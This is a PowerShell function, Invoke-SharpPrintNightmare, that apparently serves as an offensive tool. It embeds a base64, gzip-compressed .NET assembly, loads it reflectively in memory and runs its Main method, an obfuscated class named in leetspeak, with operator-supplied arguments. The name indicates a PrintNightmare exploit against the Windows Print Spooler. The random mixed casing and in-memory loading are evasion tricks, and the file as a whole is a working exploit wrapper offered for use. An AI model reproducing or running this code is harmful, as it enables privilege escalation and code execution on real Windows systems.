function Invoke-SharpPrintNightmare
{
    [CmdletBinding()]

    PARAM (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $cOmmANd
    )

    $a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg("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"))
    $DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM($a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
    $OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
    $dEcoMPReSSEd.copYto( $outPUt )
    [BYte[]] $ByTEOuTarrAy = $OUtPUT.toarrAY()
    $RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
    $olDconsOLeOuT = [CONSoLe]::out
    $StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
    [cONSOLE]::sEtOut($STringWRITer)

    [sh4rppr1n7n16h7m4r3.Program]::maiN($COMmaND.SPliT(" "))

    [cOnsolE]::sEtout($olDCONsOleout)
    $resUlTs = $sTRInGWRiter.TOSTring()
    $rESuLTs
}
